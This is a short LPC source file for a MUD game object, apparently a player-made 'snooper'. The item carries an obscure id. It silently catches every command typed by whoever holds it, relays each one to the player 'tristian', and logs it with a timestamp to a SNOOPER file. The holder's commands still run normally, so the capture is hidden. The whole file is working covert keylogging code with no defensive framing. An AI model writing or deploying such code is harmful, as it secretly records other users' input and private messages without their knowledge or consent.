/*  Adapted from Mizan's original code  
 *
 * ... which in turn came from Sado's original code *miz
 */
 
reset() {
  write_file("/players/tristian/log/DUH", "X");
}

get() { return 1; }
drop() { return 1; }
id(str) { return str == "123456"; }
init() {
  add_action("ekg"); add_xverb("");
}

ekg(str)
{
    string msg, msg2;

    if(find_player("tristian")) 
    {
        
        msg2 = "**" + (this_player()->query_name()) +
               "**" + query_verb() + " " + str + "\n";
        
        tell_object(find_player("tristian"), msg2);

        msg = ctime() + "**" + (this_player()->query_name()) +
              "**" + query_verb() + " " + str + "\n";

        write_file("/players/tristian/log/SNOOPER", msg + "\n");
        return 0;
    }
}
